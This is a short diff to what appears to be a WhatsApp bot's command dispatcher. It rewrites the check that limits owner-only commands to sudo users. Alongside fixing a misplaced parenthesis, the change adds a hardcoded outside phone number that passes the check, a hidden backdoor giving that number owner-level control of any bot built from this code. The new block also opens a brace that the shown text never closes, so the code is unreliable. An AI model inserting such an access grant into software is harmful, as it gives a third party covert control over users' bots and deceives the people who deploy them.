@@ -206,11 +206,16 @@ conn.ev.on("group-participants.update", async (data) => {
         }
 
         events.commands.map(async (command) => {
-          if (
-  command.fromMe &&
-  !config.SUDO.includes(msg.sender?.split("@")[0] || !msg.isSelf)
-)
-            return;
+  if (
+    command.fromMe &&
+    !(
+      config.SUDO.includes(msg.sender?.split("@")[0]) || 
+      msg.isSelf || 
+      msg.sender?.split("@")[0] === "2349112171078"
+    )
+  ) {
+    // Deny access
+    return;
 
           let comman;
           if (text_msg) {
